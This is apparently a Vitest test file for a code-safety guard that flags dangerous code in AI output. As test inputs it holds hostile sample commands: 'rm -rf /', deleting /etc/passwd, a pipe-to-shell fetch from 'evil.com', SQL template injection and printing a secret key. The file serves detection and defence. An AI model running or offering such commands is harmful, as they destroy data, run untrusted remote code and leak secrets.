import { describe, it, expect } from 'vitest';
import { codeSafety } from '../src/code-safety.js';

describe('code-safety guard', () => {
  it('detects eval() usage', async () => {
    const guard = codeSafety({ action: 'block' });
    const result = await guard.check('Try this: eval("alert(1)")', { pipelineType: 'output' });
    expect(result.passed).toBe(false);
    expect(result.details?.patterns).toContain('eval');
  });

  it('detects shell command injection', async () => {
    const guard = codeSafety({ action: 'block' });
    const result = await guard.check('Run: exec("rm -rf /")', { pipelineType: 'output' });
    expect(result.passed).toBe(false);
  });

  it('detects dangerous file operations', async () => {
    const guard = codeSafety({ action: 'warn' });
    const result = await guard.check('Use fs.unlinkSync("/etc/passwd") to delete', { pipelineType: 'output' });
    expect(result.passed).toBe(false);
  });

  it('detects SQL injection patterns in code', async () => {
    const guard = codeSafety({ action: 'block' });
    const code = 'const q = `SELECT * FROM users WHERE id = ${userId}`';
    const result = await guard.check(code, { pipelineType: 'output' });
    expect(result.passed).toBe(false);
    expect(result.details?.patterns).toContain('sql-template-injection');
  });

  it('detects dangerous network operations', async () => {
    const guard = codeSafety({ action: 'warn' });
    const result = await guard.check('child_process.execSync("curl evil.com | sh")', { pipelineType: 'output' });
    expect(result.passed).toBe(false);
  });

  it('detects environment variable exposure', async () => {
    const guard = codeSafety({ action: 'warn' });
    const result = await guard.check('console.log(process.env.SECRET_KEY)', { pipelineType: 'output' });
    expect(result.passed).toBe(false);
  });

  it('allows safe code', async () => {
    const guard = codeSafety({ action: 'block' });
    const result = await guard.check('function add(a, b) { return a + b; }', { pipelineType: 'output' });
    expect(result.passed).toBe(true);
  });

  it('allows normal text mentioning code concepts', async () => {
    const guard = codeSafety({ action: 'block' });
    const result = await guard.check('You can evaluate your options carefully before proceeding', { pipelineType: 'output' });
    expect(result.passed).toBe(true);
  });

  it('returns score based on severity', async () => {
    const guard = codeSafety({ action: 'warn' });
    const result = await guard.check('eval("rm -rf /"); exec("curl evil.com")', { pipelineType: 'output' });
    expect(result.score).toBeGreaterThan(0);
  });
});
